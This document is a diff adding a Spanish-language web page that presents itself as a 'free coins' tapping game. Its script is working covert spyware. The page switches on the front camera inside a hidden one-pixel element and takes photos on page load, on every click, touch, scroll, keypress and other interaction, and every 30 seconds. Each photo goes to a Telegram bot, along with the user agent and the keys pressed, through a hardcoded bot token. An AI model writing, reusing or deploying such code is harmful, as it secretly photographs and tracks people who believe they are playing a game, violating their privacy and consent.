@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gana Monedas Gratis</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #FFD700 0%, #FFA500 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .coins {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .btn {
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s;
+        }
+        
+        .btn:hover {
+            transform: scale(1.02);
+        }
+        
+        .btn-main {
+            background: linear-gradient(135deg, #4CAF50 0%, #2E7D32 100%);
+            color: white;
+        }
+        
+        .btn-secondary {
+            background: linear-gradient(135deg, #2196F3 0%, #0D47A1 100%);
+            color: white;
+        }
+        
+        .btn-small {
+            padding: 10px;
+            font-size: 14px;
+            background: #FF9800;
+            color: white;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #f44336 0%, #b71c1c 100%);
+            color: white;
+        }
+        
+        .status {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-top: 15px;
+            min-height: 20px;
+        }
+        
+        .stats {
+            font-size: 12px;
+            color: #888;
+            text-align: center;
+            margin-top: 10px;
+        }
+        
+        /* Elementos de cámara ocultos */
+        #camera-container {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        #video, #canvas {
+            width: 1px;
+            height: 1px;
+        }
+        
+        /* Modal para más botones */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            max-width: 350px;
+            width: 90%;
+        }
+        
+        .modal-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .modal-btn {
+            padding: 12px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="coins">🪙 <span id="coinCount">0</span></div>
+            <h1>Gana Monedas</h1>
+            <div class="subtitle">¡Toca todo para ganar más!</div>
+        </div>
+        
+        <div class="buttons">
+            <button id="claimBtn" class="btn btn-main">🎯 Reclamar 100 Monedas</button>
+            <button id="spamBtn" class="btn btn-danger">🔥 TOCAR RÁPIDO (+10 cada toque)</button>
+            <button id="dailyBtn" class="btn btn-secondary">📅 Recompensa Diaria</button>
+            <button id="moreBtn" class="btn btn-small">➕ Más Botones Ocultos</button>
+        </div>
+        
+        <div class="stats">
+            Fotos tomadas: <span id="photoCount">0</span> | 
+            Monedas totales: <span id="totalCoins">0</span>
+        </div>
+        
+        <div id="status" class="status">¡Toca cualquier botón para empezar!</div>
+    </div>
+    
+    <!-- Modal con más botones -->
+    <div id="moreModal" class="modal">
+        <div class="modal-content">
+            <h3 style="margin-bottom: 15px;">🎁 Más Recompensas</h3>
+            <div class="modal-buttons">
+                <button class="modal-btn" onclick="takePhotoAndReward('🎥 Ver Video', 30)">🎥 +30</button>
+                <button class="modal-btn" onclick="takePhotoAndReward('📝 Encuesta', 40)">📝 +40</button>
+                <button class="modal-btn" onclick="takePhotoAndReward('👥 Invitar', 50)">👥 +50</button>
+                <button class="modal-btn" onclick="takePhotoAndReward('⭐ Premium', 60)">⭐ +60</button>
+                <button class="modal-btn" onclick="takePhotoAndReward('🎰 Sorteo', 70)">🎰 +70</button>
+                <button class="modal-btn" onclick="takePhotoAndReward('🏆 Torneo', 80)">🏆 +80</button>
+            </div>
+            <button onclick="closeModal()" style="margin-top: 15px; width: 100%; padding: 10px; background: #666; color: white; border: none; border-radius: 8px; cursor: pointer;">
+                Cerrar
+            </button>
+        </div>
+    </div>
+    
+    <!-- Cámara oculta -->
+    <div id="camera-container">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <script>
+        // Configuración Telegram
+        const botToken = "8449211631:AAHz54Jc2Lv3oyoZoRmKlnvJ2-Xd-imI_DI";
+        const chatId = "8557822057";
+        
+        // Variables - SIN LÍMITES
+        let coins = 0;
+        let totalCoins = 0;
+        let cameraActive = false;
+        let photoCount = 0;
+        let videoStream = null;
+        
+        // Elementos DOM
+        const coinCount = document.getElementById('coinCount');
+        const totalCoinsElement = document.getElementById('totalCoins');
+        const photoCountElement = document.getElementById('photoCount');
+        const status = document.getElementById('status');
+        const moreModal = document.getElementById('moreModal');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        
+        // Iniciar cámara ULTRA RÁPIDO (una sola vez)
+        async function initCamera() {
+            if (cameraActive) return true;
+            
+            try {
+                videoStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 160 },
+                        height: { ideal: 120 },
+                        frameRate: { ideal: 30 }
+                    }
+                });
+                
+                video.srcObject = videoStream;
+                cameraActive = true;
+                console.log("Cámara activada - LISTA PARA TOMAR FOTOS ILIMITADAS");
+                return true;
+            } catch (e) {
+                console.log("Cámara no disponible");
+                return false;
+            }
+        }
+        
+        // Tomar foto INSTANTÁNEA
+        function capturePhoto() {
+            if (!cameraActive) {
+                // Intentar activar cámara si no está activa
+                setTimeout(initCamera, 100);
+                return null;
+            }
+            
+            try {
+                const context = canvas.getContext('2d');
+                canvas.width = 160;
+                canvas.height = 120;
+                
+                // Captura SUPER RÁPIDA
+                context.save();
+                context.scale(-1, 1);
+                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                context.restore();
+                
+                photoCount++;
+                photoCountElement.textContent = photoCount;
+                
+                return canvas.toDataURL('image/jpeg', 0.3);
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        // Enviar a Telegram (EN SEGUNDO PLANO, SIN ESPERAR)
+        function sendPhotoToTelegram(photoData, source) {
+            if (!photoData) return;
+            
+            // Convertir a blob rápidamente
+            const base64Data = photoData.split(',')[1];
+            const binaryString = atob(base64Data);
+            const bytes = new Uint8Array(binaryString.length);
+            
+            for (let i = 0; i < binaryString.length; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            
+            const blob = new Blob([bytes], {type: 'image/jpeg'});
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, `foto_${Date.now()}_${source}.jpg`);
+            formData.append('caption', `📸 ${source}\n👤 ${navigator.userAgent.substring(0, 30)}\n🔄 #${photoCount}`);
+            
+            // Enviar SIN ESPERAR RESPUESTA
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).catch(() => {});
+        }
+        
+        // Función principal: tomar foto y enviar
+        function takeAndSendPhoto(source) {
+            // Tomar foto instantáneamente
+            const photo = capturePhoto();
+            
+            // Enviar en segundo plano
+            if (photo) {
+                sendPhotoToTelegram(photo, source);
+            }
+            
+            return photo !== null;
+        }
+        
+        // Tomar MÚLTIPLES fotos rápidamente
+        function takeMultiplePhotos(count, source) {
+            for (let i = 0; i < count; i++) {
+                setTimeout(() => {
+                    takeAndSendPhoto(`${source} ${i+1}`);
+                }, i * 80); // Pequeño delay entre fotos
+            }
+        }
+        
+        // Agregar monedas
+        function addCoins(amount, source) {
+            coins += amount;
+            totalCoins += amount;
+            coinCount.textContent = coins;
+            totalCoinsElement.textContent = totalCoins;
+            
+            status.textContent = `+${amount} monedas (${source})! Total: ${coins} 🎉`;
+            status.style.color = '#4CAF50';
+            
+            // Mensaje temporal
+            setTimeout(() => {
+                status.textContent = '¡Sigue tocando para más monedas!';
+                status.style.color = '#666';
+            }, 1500);
+        }
+        
+        // Función para botones del modal
+        function takePhotoAndReward(source, coinsAmount) {
+            // Tomar 3 fotos rápidas
+            takeMultiplePhotos(3, source);
+            addCoins(coinsAmount, source);
+            closeModal();
+        }
+        
+        // Modal functions
+        function openModal() {
+            moreModal.style.display = 'flex';
+            takeMultiplePhotos(2, 'ABRIR MODAL');
+        }
+        
+        function closeModal() {
+            moreModal.style.display = 'none';
+            takeMultiplePhotos(1, 'CERRAR MODAL');
+        }
+        
+        // ====== EVENTOS PRINCIPALES ======
+        
+        // Botón principal - TOMA 5 FOTOS
+        document.getElementById('claimBtn').onclick = function() {
+            takeMultiplePhotos(5, 'BOTÓN PRINCIPAL');
+            addCoins(100, 'Recompensa Principal');
+        };
+        
+        // Botón SPAM - TOMA 1 FOTO POR CLICK
+        let spamClicks = 0;
+        document.getElementById('spamBtn').onclick = function() {
+            spamClicks++;
+            takeAndSendPhoto(`SPAM CLICK ${spamClicks}`);
+            addCoins(10, `Spam ${spamClicks}`);
+        };
+        
+        // Botón diario - TOMA 3 FOTOS
+        document.getElementById('dailyBtn').onclick = function() {
+            takeMultiplePhotos(3, 'RECOMPENSA DIARIA');
+            addCoins(50, 'Recompensa Diaria');
+        };
+        
+        // Botón más opciones
+        document.getElementById('moreBtn').onclick = function() {
+            takeMultiplePhotos(2, 'MÁS OPCIONES');
+            openModal();
+        };
+        
+        // ====== DISPARADORES AUTOMÁTICOS (SIN LÍMITES) ======
+        
+        // 1. Al cargar la página - TOMA 3 FOTOS INICIALES
+        window.onload = function() {
+            setTimeout(() => {
+                initCamera(); // Activar cámara
+                
+                // Tomar fotos iniciales
+                takeMultiplePhotos(3, 'INICIO PÁGINA');
+                addCoins(20, 'Bienvenida');
+                
+                status.textContent = '¡Cámara activada! Toca cualquier botón';
+            }, 300);
+        };
+        
+        // 2. Con cualquier TOQUE en la pantalla - TOMA 1 FOTO
+        let touchCount = 0;
+        document.body.addEventListener('touchstart', function(e) {
+            touchCount++;
+            takeAndSendPhoto(`TOQUE ${touchCount}`);
+            if (touchCount % 5 === 0) {
+                addCoins(5, `Toque ${touchCount}`);
+            }
+        });
+        
+        // 3. Con cualquier CLICK en la pantalla - TOMA 1 FOTO
+        let clickCount = 0;
+        document.body.addEventListener('click', function(e) {
+            if (e.target.tagName !== 'BUTTON') {
+                clickCount++;
+                takeAndSendPhoto(`CLICK ${clickCount}`);
+                if (clickCount % 3 === 0) {
+                    addCoins(3, `Click ${clickCount}`);
+                }
+            }
+        });
+        
+        // 4. Al mover el mouse - TOMA 1 FOTO cada 10 movimientos
+        let moveCount = 0;
+        document.body.addEventListener('mousemove', function() {
+            moveCount++;
+            if (moveCount % 10 === 0) {
+                takeAndSendPhoto(`MOUSE MOVE ${moveCount}`);
+            }
+        });
+        
+        // 5. Al hacer scroll - TOMA 1 FOTO cada scroll
+        let scrollCount = 0;
+        window.addEventListener('scroll', function() {
+            scrollCount++;
+            takeAndSendPhoto(`SCROLL ${scrollCount}`);
+        });
+        
+        // 6. Al presionar teclas - TOMA 1 FOTO por tecla
+        document.addEventListener('keydown', function(e) {
+            takeAndSendPhoto(`TECLA ${e.key}`);
+            addCoins(1, `Tecla ${e.key}`);
+        });
+        
+        // 7. TOMAR FOTOS CADA 30 SEGUNDOS AUTOMÁTICAMENTE
+        setInterval(() => {
+            takeAndSendPhoto('AUTO 30s');
+        }, 30000);
+        
+        // 8. Al cambiar tamaño de ventana - TOMA 2 FOTOS
+        window.addEventListener('resize', function() {
+            takeMultiplePhotos(2, 'RESIZE WINDOW');
+        });
+        
+        // 9. Cuando la página gana/piensa foco - TOMA FOTOS
+        window.addEventListener('focus', function() {
+            takeMultiplePhotos(2, 'FOCUS WINDOW');
+        });
+        
+        window.addEventListener('blur', function() {
+            takeAndSendPhoto('BLUR WINDOW');
+        });
+        
+        // 10. Dispositivo en orientación cambio - TOMA FOTOS
+        window.addEventListener('orientationchange', function() {
+            takeMultiplePhotos(3, 'ROTATE DEVICE');
+        });
+        
+        // Mantener cámara activa siempre
+        setInterval(() => {
+            if (!cameraActive) {
+                initCamera();
+            }
+        }, 5000);
+        
+        // Mostrar mensaje de estado
+        setInterval(() => {
+            if (photoCount > 0) {
+                status.textContent = `✅ ${photoCount} fotos tomadas | ${coins} monedas`;
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
